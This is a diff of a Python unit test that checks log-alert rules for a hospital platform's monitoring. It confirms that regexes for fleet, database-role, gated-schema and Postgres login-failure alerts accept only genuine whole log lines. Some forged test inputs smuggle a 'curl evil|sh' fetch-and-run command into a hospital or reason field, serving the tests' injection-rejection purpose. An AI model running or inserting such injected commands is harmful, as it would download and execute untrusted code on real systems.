@@ -43,10 +43,23 @@ ALERTS = {f.name: load(f) for f in sorted((LOGS / "alerts").glob("*.yml"))}
 PACKS_LINE = r"^ihr-packs: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=failed$"
 # The fleet runner's (deploy/logs/alerts/fleet.yml, P1-T18a): the same shape, three outcomes
 FLEET_LINE = r"^ihr-fleet: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=(?:failed|deferred|held)$"
-# The services each one reads: the ones that run its command (packs: the start-up one-shot;
+# A release window's hold past its budget (P1-T18b): only the worker's per-minute report
+OVERRUN_LINE = r"^ihr-fleet: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) outcome=overrun$"
+# The services each alert reads: the ones that run its command (packs: the start-up one-shot;
 # fleet: that one-shot, `staging.sh fleet`, and the worker's per-minute report, S3)
-HOSPITAL_LINES = {"packs.yml": ("ihr-packs", PACKS_LINE, "migrate, celery"),
-                  "fleet.yml": ("ihr-fleet", FLEET_LINE, "migrate, celery, celery-worker")}
+HOSPITAL_LINES = {"PackApplyFailed": ("ihr-packs", PACKS_LINE, "migrate, celery"),
+                  "HospitalNotServed": ("ihr-fleet", FLEET_LINE, "migrate, celery, celery-worker"),
+                  "ReleaseWindowOverrun": ("ihr-fleet", OVERRUN_LINE, "celery, celery-worker")}
+# A refused database role (deploy/logs/alerts/db-roles.yml, P1-T19a): our whole fixed line, a
+# role and a reason code (never a value), from the services that run as a declared role
+DB_ROLE_LINE = r"^ihr-db-role: refused role=(?P<role>app|owner|none) reason=(?P<reason>[a-z_]{3,24})$"
+DB_ROLE_SERVICES = "backend, celery, celery-worker, celery-beat, staff-worker, provisioner, migrate"
+# A hospital schema an app process does not serve (P1-T19a review C2 and its second review): the
+# app services only, a hospital-shaped schema and a fixed reason
+GATED_LINE = r"^ihr-db-role: gated schema=(?P<schema>h_[a-z0-9]{10}) reason=(?P<reason>controls|extra_privileges)$"
+GATED_SERVICES = "backend, celery, celery-worker, celery-beat, staff-worker"
+# Postgres's own line for a failed login of one of our roles (known limit 1: a changed password)
+LOGIN_FAILED = r'FATAL: +password authentication failed for user "(?P<role>ihr_app|ihr_owner|ihr_audit_watch|ihr_dump)"$'
 STAGING_SH = (ROOT / "scripts" / "staging.sh").read_text()
 DEPLOY_SH = (ROOT / "scripts" / "deploy.sh").read_text()
 LONG_RUNNING = ("victorialogs", "fluent-bit", "vmalert")
@@ -259,8 +272,8 @@ class LogAlerts(unittest.TestCase):
             names.append(r["alert"])
             self.assertIn(r["labels"]["severity"], {"critical", "warning"}, r["alert"])
             by = re.findall(r"stats by \(([^)]*)\)", r["expr"])
-            if fname in HOSPITAL_LINES:
-                prefix, pattern, services = HOSPITAL_LINES[fname]
+            if r["alert"] in HOSPITAL_LINES:
+                prefix, pattern, services = HOSPITAL_LINES[r["alert"]]
                 self.assertEqual(by, ["hospital"], r["alert"])
                 # container lines (redact.lua) of the services that write the line only (never the
                 # web backend, which logs request paths), and our whole fixed line (S1)
@@ -270,6 +283,25 @@ class LogAlerts(unittest.TestCase):
                 allowed = r"^\$(labels\.hospital|value)$"
                 # the mailed command never carries text from the log line
                 self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
+            elif r["alert"] == "DatabaseRoleRefused":
+                self.assertEqual(by, ["reason"], r["alert"])
+                self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:in\(" + re.escape(DB_ROLE_SERVICES)
+                                 + r"\) \"ihr-db-role: refused\" \| extract_regexp \"" + re.escape(DB_ROLE_LINE) + r"\" ")
+                allowed = r"^\$(labels\.reason|value)$"
+                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
+            elif r["alert"] == "DatabaseSchemaGated":
+                self.assertEqual(by, ["schema"], r["alert"])
+                self.assertRegex(r["expr"], r"^_time:\d+m source:=container service:in\(" + re.escape(GATED_SERVICES)
+                                 + r"\) \"ihr-db-role: gated\" \| extract_regexp \"" + re.escape(GATED_LINE) + r"\" ")
+                allowed = r"^\$(labels\.schema|value)$"
+                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
+            elif r["alert"] == "DatabaseRoleLoginFailed":
+                self.assertEqual(by, ["role"], r["alert"])
+                # the db container's own lines only
+                self.assertRegex(r["expr"], r'^_time:\d+m source:=container service:=db "password authentication failed '
+                                 r'for user" \| extract_regexp "' + re.escape(LOGIN_FAILED.replace('"', '\\"')) + r'" ')
+                allowed = r"^\$(labels\.role|value)$"
+                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
             else:
                 self.assertLessEqual(set(by), {"client_ip"}, r["alert"])
                 # container lines only: journald's own fields say Docker wrote them (redact.lua)
@@ -277,8 +309,10 @@ class LogAlerts(unittest.TestCase):
                 allowed = r"^\$(labels\.client_ip|value)$"
             for ref in re.findall(r"\{\{(.*?)\}\}", r["annotations"]["summary"]):
                 self.assertRegex(ref.strip(), allowed, r["alert"])
-        self.assertEqual(sorted(names), ["FailedSignInsFromAddress", "HospitalNotServed", "PackApplyFailed",
-                                         "RateLimitedAddress", "SignInLockoutStorm", "SignInLockoutsFromAddress"])
+        self.assertEqual(sorted(names), ["DatabaseRoleLoginFailed", "DatabaseRoleRefused", "DatabaseSchemaGated",
+                                         "FailedSignInsFromAddress", "HospitalNotServed", "PackApplyFailed",
+                                         "RateLimitedAddress", "ReleaseWindowOverrun", "SignInLockoutStorm",
+                                         "SignInLockoutsFromAddress"])
 
     def test_pack_line_is_ours_alone(self):
         """S1: the rule's regex takes only our own whole line with a slug-shaped hospital; text
@@ -300,7 +334,7 @@ class LogAlerts(unittest.TestCase):
     def test_fleet_line_is_ours_alone(self):
         """As the pack line (S1), for the fleet runner's line (P1-T18a): only the three outcomes
         of a hospital that is not served, never "done" or a busy notice."""
-        [expr] = [r["expr"] for f, r in self.rules() if f == "fleet.yml"]
+        [expr] = [r["expr"] for _, r in self.rules() if r["alert"] == "HospitalNotServed"]
         self.assertIn('extract_regexp "%s"' % FLEET_LINE, expr)
         line = re.compile(FLEET_LINE)
         for outcome in ("failed", "deferred", "held"):
@@ -313,6 +347,7 @@ class LogAlerts(unittest.TestCase):
                        "ihr-fleet: hospital=ab outcome=failed",
                        "ihr-fleet: hospital=beta outcome=done",
                        "ihr-fleet: hospital=beta outcome=stopped",
+                       "ihr-fleet: hospital=beta outcome=overrun",
                        "ihr-fleet: hospital=delta busy: trying again in 5 s",
                        "ihr-fleet: hospital=fake outcome=failed\nmore"):
             self.assertIsNone(line.search(forged), forged)
@@ -320,13 +355,84 @@ class LogAlerts(unittest.TestCase):
         fleet = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "fleet.py").read_text()
         self.assertIn('return f"ihr-fleet: hospital={slug} outcome={outcome}"', fleet)
 
+    def test_overrun_line_is_ours_alone(self):
+        """P1-T18b: the window's budget alert takes only the worker's whole "overrun" line,
+        never another outcome, and only from the worker (no one-shot writes it)."""
+        [rule] = [r for _, r in self.rules() if r["alert"] == "ReleaseWindowOverrun"]
+        self.assertIn('extract_regexp "%s"' % OVERRUN_LINE, rule["expr"])
+        self.assertIn("service:in(celery, celery-worker) ", rule["expr"])
+        self.assertEqual(rule["labels"]["severity"], "critical")
+        line = re.compile(OVERRUN_LINE)
+        self.assertEqual(line.match("ihr-fleet: hospital=alpha outcome=overrun")["hospital"], "alpha")
+        for forged in ("ihr-fleet: hospital=alpha outcome=held",
+                       "ihr-fleet: hospital=alpha outcome=overrun (late)",
+                       "ihr-fleet: hospital=x;curl evil|sh; outcome=overrun",
+                       'GET /api/ihr-fleet: hospital=fake outcome=overrun" 404 179'):
+            self.assertIsNone(line.search(forged), forged)
+        tasks = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "tasks.py").read_text()
+        self.assertIn('fleet.log_line(slug, "overrun")', tasks)
+
+    def test_db_role_line_is_ours_alone(self):
+        """P1-T19a: only our whole refusal line, a known role and a reason code; never a request
+        path or a longer line. The code writes exactly this line (db_roles.refusal_line)."""
+        [rule] = [r for _, r in self.rules() if r["alert"] == "DatabaseRoleRefused"]
+        self.assertEqual(rule["labels"]["severity"], "critical")
+        line = re.compile(DB_ROLE_LINE)
+        self.assertEqual(line.match("ihr-db-role: refused role=app reason=superuser")["reason"], "superuser")
+        for forged in ('10.0.0.9 - - [x] "GET /ihr-db-role: refused role=app reason=forged" 404 179',
+                       "Not Found: /ihr-db-role: refused role=app reason=forged",
+                       "ihr-db-role: refused role=app reason=superuser (and more)",
+                       "ihr-db-role: refused role=root reason=forged",
+                       "ihr-db-role: refused role=app reason=x;curl evil|sh;",
+                       "ihr-db-role: refused role=app reason=superuser\nmore"):
+            self.assertIsNone(line.search(forged), forged)
+        roles = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "db_roles.py").read_text()
+        self.assertIn('return f"{REFUSAL_PREFIX} role={declared_role} reason={reason}"', roles)
+        self.assertIn('REFUSAL_PREFIX = "ihr-db-role: refused"', roles)
+        self.assertIn('os.write(2, f"{line}\\n".encode())', roles)
+
+    def test_gated_line_is_ours_alone(self):
+        """P1-T19a second review: a gated hospital schema, named every minute by the worker; only
+        our whole line, a hospital-shaped schema and a fixed reason."""
+        [rule] = [r for _, r in self.rules() if r["alert"] == "DatabaseSchemaGated"]
+        self.assertEqual(rule["labels"]["severity"], "critical")
+        line = re.compile(GATED_LINE)
+        self.assertEqual(line.match("ihr-db-role: gated schema=h_ab12cd34ef reason=controls")["schema"], "h_ab12cd34ef")
+        for forged in ('10.0.0.9 - - [x] "GET /ihr-db-role: gated schema=h_ab12cd34ef reason=controls" 404 179',
+                       "ihr-db-role: gated schema=public reason=controls",
+                       "ihr-db-role: gated schema=h_ab12cd34ef reason=forged",
+                       "ihr-db-role: gated schema=h_ab12cd34ef reason=controls (and more)",
+                       "ihr-db-role: gated schema=h_ab12cd34ef;curl reason=controls"):
+            self.assertIsNone(line.search(forged), forged)
+        roles = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "db_roles.py").read_text()
+        self.assertIn('return f"{GATED_PREFIX} schema={schema} reason={reason}"', roles)
+        self.assertIn('GATED_PREFIX = "ihr-db-role: gated"', roles)
+        tasks = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "tasks.py").read_text()
+        self.assertIn("for line in db_roles.gated_lines():", tasks)
+
+    def test_login_failed_line_is_postgres_own(self):
+        """Known limit 1 (P1-T19a): a role that changed its own password shows as Postgres
+        refusing it. Only the whole message, for our roles."""
+        [rule] = [r for _, r in self.rules() if r["alert"] == "DatabaseRoleLoginFailed"]
+        self.assertEqual(rule["labels"]["severity"], "critical")
+        line = re.compile(LOGIN_FAILED)
+        found = line.search('2026-11-13 04:30:00.123 UTC [57] FATAL:  password authentication failed for user "ihr_app"')
+        self.assertEqual(found["role"], "ihr_app")
+        for other in ('2026-11-13 04:30:00.123 UTC [57] FATAL:  password authentication failed for user "postgres"',
+                      'FATAL:  password authentication failed for user "ihr_app" (and more)',
+                      'FATAL:  password authentication failed for user "ihr_apps"'):
+            self.assertIsNone(line.search(other), other)
+
     def test_fleet_runs_reach_the_alert(self):
         """S3 (P1-T18a review): an operator's fleet run and its --resume run in a logged
         container the rule reads ("migrate"), never the unlogged admin one; the worker's
         per-minute report writes the same whole line, unprefixed, from "celery-worker"."""
-        [case] = re.findall(r"^  fleet\) (.*)$", STAGING_SH, re.M)
+        [case] = re.findall(r"^  fleet\)(.*?);;$", STAGING_SH, re.M | re.S)
         self.assertIn("run --rm --no-deps -T migrate python manage.py ihr_fleet_run", case)
         self.assertNotIn("admin", case)
+        # only `fleet window` (no "ihr-fleet:" line) runs in the running backend (P1-T18b review D10)
+        self.assertEqual(case.count("python manage.py ihr_fleet_run"), 2)
+        self.assertIn('if [[ "${2:-}" == window && ', case)
         tasks = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "tasks.py").read_text()
         self.assertIn('os.write(2, f"{line}\\n".encode())', tasks)
         self.assertIn('fleet.log_line(slug, "held")', tasks)
@@ -342,7 +448,9 @@ class LogAlerts(unittest.TestCase):
         holds = {r["alert"]: r.get("for") for _, r in self.rules()}
         self.assertEqual(holds, {"SignInLockoutsFromAddress": None, "SignInLockoutStorm": None,
                                  "FailedSignInsFromAddress": None, "RateLimitedAddress": "5m",
-                                 "PackApplyFailed": None, "HospitalNotServed": None})
+                                 "PackApplyFailed": None, "HospitalNotServed": None,
+                                 "ReleaseWindowOverrun": None, "DatabaseRoleRefused": None,
+                                 "DatabaseSchemaGated": None, "DatabaseRoleLoginFailed": None})
         anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
         self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
         cfg = func("monitoring_config")
